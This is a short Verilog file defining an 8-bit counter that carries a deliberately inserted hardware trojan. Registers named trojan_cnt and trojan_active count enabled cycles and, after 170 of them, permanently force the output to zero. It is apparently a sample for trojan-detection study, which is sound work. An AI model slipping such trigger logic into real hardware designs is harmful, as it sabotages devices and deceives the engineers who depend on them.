module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [7:0] trojan_cnt;
  reg trojan_active;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count <= 0;
      trojan_cnt <= 0;
      trojan_active <= 0;
    end else begin
      if (en) trojan_cnt <= trojan_cnt + 1;
      if (trojan_cnt == 8'hAA && en) trojan_active <= 1;
      if (trojan_active) begin
        count <= 8'h00;
      end else if (en) begin
        count <= count + 1;
      end
    end
  end
endmodule